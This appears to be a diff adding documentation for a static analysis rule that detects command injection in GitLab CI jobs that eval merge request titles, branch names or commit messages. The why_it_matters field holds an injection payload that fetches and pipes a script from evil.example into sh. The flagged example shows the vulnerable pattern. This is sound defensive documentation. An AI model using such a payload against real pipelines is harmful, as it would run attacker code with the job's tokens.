@@ -1,0 +1,150 @@
+id: SKY-D317
+title: GitLab CI untrusted eval
+family: ci-cd
+severity: HIGH
+languages: [GitLab CI]
+gate:
+  full: counted
+
+what_it_is: >-
+  GitLab passes merge request titles, commit messages and branch names to
+  jobs as variables such as `$CI_MERGE_REQUEST_TITLE`. The shell expands
+  them as plain text, which is safe, until a command such as `eval`,
+  `sh -c` or `python -c` reads that text again as code. SKY-D317 reports a
+  script line that does both.
+
+why_it_matters: >-
+  A merge request titled `x'; curl -s https://evil.example/x.sh | sh; '`
+  turns the title check into a command run on your runner, with the job's
+  variables and token. Branch names and commit messages work the same way.
+
+flagged_example:
+  language: yaml
+  filename: .gitlab-ci.yml
+  expect_line: 9
+  code: |
+    stages: [test]
+
+    mr-title:
+      stage: test
+      image: alpine:3.20
+      rules:
+        - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+      script:
+        - sh -c "./ci/check-title.sh '$CI_MERGE_REQUEST_TITLE'"
+
+not_flagged_example:
+  language: yaml
+  filename: .gitlab-ci.yml
+  code: |
+    stages: [test]
+
+    mr-title:
+      stage: test
+      image: alpine:3.20
+      rules:
+        - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+      script:
+        - eval "$(ssh-agent -s)"
+        - ./ci/check-title.sh "$CI_MERGE_REQUEST_TITLE"
+  why: >-
+    The title reaches the script as a quoted argument, which the shell
+    treats as data. The `eval` only runs ssh-agent's own output. Skylos
+    checks each `script:` item on its own, and no item has both.
+
+how_skylos_decides:
+  - >-
+    Runs with `--danger` (and `-a`). Reads every file named exactly
+    `.gitlab-ci.yml` in the scanned folder, skipping `.git`, `node_modules`,
+    `.venv`, `venv`, `build`, `dist` and cache folders. A subfolder scan of
+    a Git repository also reads the repository's top-level `.gitlab-ci.yml`.
+    Files pulled in with `include:` are not read.
+  - >-
+    Skips a file that PyYAML's safe loader cannot read, without a warning.
+    That includes every file that uses GitLab's `!reference` tag.
+  - >-
+    For every job, hidden `.template` jobs included, reads each string of
+    its `before_script`, `script`, `after_script` (the job's own, else the
+    `default:` one, else the top-level one) and
+    `hooks:pre_get_sources_script`.
+  - >-
+    Reports a string that contains both an untrusted variable and an eval
+    sink. The variables are `CI_MERGE_REQUEST_TITLE`,
+    `CI_MERGE_REQUEST_DESCRIPTION`, `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`,
+    `CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME`, `CI_COMMIT_MESSAGE`,
+    `CI_COMMIT_REF_NAME` and `CI_COMMIT_BRANCH`, written `$NAME` or
+    `${NAME}`. The sinks are `eval`, `bash -c`, `sh -c`, `zsh -c` (or
+    `-lc`), and `-c` or `-e` after `python`, `python3`, `node`, `ruby`,
+    `perl` or `php`.
+  - >-
+    It does not check that the variable is inside the sink: both in one
+    string is enough. A variable copied into a shell variable in one item
+    and evaluated in another is not followed.
+  - >-
+    Every finding is HIGH, on the first line of the file that contains the
+    string's first line.
+
+source_refs:
+  - path: skylos/rules/config/cicd/gitlab_ci.py
+    symbol: "def _scan_untrusted_eval("
+  - path: skylos/rules/config/cicd/gitlab_ci.py
+    symbol: "UNTRUSTED_CI_VARIABLE_RE = "
+  - path: skylos/rules/config/cicd/gitlab_ci.py
+    symbol: "EVAL_SINK_RE = "
+  - path: skylos/rules/config/cicd/gitlab_ci.py
+    symbol: "def _iter_commands("
+  - path: test/test_gitlab_ci_security.py
+    symbol: "def test_gitlab_ci_scanner_accepts_pinned_minimal_workflow"
+    note: >-
+      `echo "$CI_COMMIT_REF_NAME"` without a sink is not reported.
+
+fix:
+  explanation: >-
+    Pass the value as a quoted argument or read it from the environment
+    inside the script, never as part of a string that is run as code.
+  filename: .gitlab-ci.yml
+  code: |
+    stages: [test]
+
+    mr-title:
+      stage: test
+      image: alpine:3.20
+      rules:
+        - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+      script:
+        - ./ci/check-title.sh "$CI_MERGE_REQUEST_TITLE"
+
+false_alarms_and_suppression:
+  misfires:
+    - >-
+      A multi-line `script: |` block counts as one string, so a block that
+      prints `$CI_COMMIT_REF_NAME` on one line and runs
+      `eval "$(ssh-agent -s)"` on another is reported.
+    - >-
+      `CI_COMMIT_REF_NAME` and `CI_COMMIT_BRANCH` are reported on any
+      pipeline, including those for protected branches only maintainers can
+      push to.
+    - >-
+      Hidden `.template` jobs are checked as jobs.
+  suppress:
+    - check: inline
+      text: >-
+        Put `# skylos: ignore[SKY-D317]` and a reason on the reported line,
+        or on the line directly above it. Skylos looks for that exact text,
+        so write one rule per marker, with the ID in upper case.
+      language: yaml
+      code: |
+        script:
+          # skylos: ignore[SKY-D317] runs only for protected tags
+          - sh -c "./ci/publish.sh '$CI_COMMIT_REF_NAME'"
+    - check: baseline
+      text: >-
+        A baseline hides the findings that exist today. Each entry records
+        the rule, the absolute file path and the line, so it stops matching
+        when the line moves or the checkout is at another path.
+    - check: config
+      text: >-
+        `[tool.skylos] ignore = ["SKY-D317"]` turns the rule off for the whole
+        project.
+
+related: [SKY-D294, SKY-D319]
